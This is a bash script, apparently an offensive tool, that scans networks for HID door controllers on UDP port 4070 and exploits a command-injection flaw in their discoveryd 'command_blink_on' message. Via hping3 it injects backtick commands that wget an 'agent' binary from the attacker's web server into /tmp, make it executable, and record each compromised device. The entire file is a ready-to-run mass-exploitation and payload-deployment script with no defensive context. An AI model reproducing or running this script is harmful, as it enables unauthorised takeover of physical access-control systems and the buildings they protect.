#!/bin/bash
CMDEXEC=`which hping3`
EXPECTED_ARGS=2;
if [ $# -ne $EXPECTED_ARGS ]
then
  echo "Usage: ./massdeploy.sh <Attacker IP> <Targets>"
  echo "Targets should be in Nmap Format, not input file"
  echo "Example: ./massdeploy.sh 10.0.0.1 10.1.1.0/24"
  echo ""
  echo "If you've already run nmap, rename the xml to 'results.xml' and comment out the 'Running Nmap' section"
  exit 2
fi

#Prepping stuff
if [ "$(ls | egrep -q datafiles && echo "1" || echo "0")" = "0" ]
then
  mkdir datafiles
  cd ./datafiles
else
  cd ./datafiles
fi
cp ../tools/agent /var/www/html/a

#Running Nmap
#Comment out the following line if you've already completed the nmap scan
echo "Starting Nmap against $2... This could take a while."
echo "Stats will be provided every 30 seconds"
nmap -sU -p 4070 --stats-every 30s --script hid-discoveryd-enum -oA results $2 | egrep '(remaining|Stats: )'
echo "Nmap complete: -oA results at ./datafiles/results.*"
#sorting nmap
cat results.xml | grep script | sed 's/&#xa//g' | cut -d '<' -f 5 | cut -d ";" -f 3,5 | cut -d " " -f 9,5 | sed '/^\s*$/d' | sed 's/; /,/g' > hidtargets.txt

#Starting apache2
service apache2 start

#Owning Shit
echo "Agent deployment beginning"
for i in $(cat hidtargets.txt); do
  MAC=`(echo $i | cut -d ',' -f 1)`;
  IP=`(echo $i | cut -d ',' -f 2)`;
  echo 'command_blink_on;044;'$MAC';1`wget -O /tmp/agent http://'$1'/a`;' > data1.txt
  echo 'command_blink_on;044;'$MAC';1`chmod +x /tmp/agent`;' > data2.txt
  echo "Deploying agent to $IP"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data1.txt -d 150 $IP 2> /dev/null
  sleep 5
  ${CMDEXEC} -2 -p 4070 -c 1 -E data2.txt -d 150 $IP 2> /dev/null
  echo "Agent Deployed: $IP"
  echo ""
  echo "$IP $MAC" >> agents.txt
done
cd ../
service apache2 stop
echo ""
echo "Deployment complete. All agents listed in './datafiles/agents.txt'"
exit 1
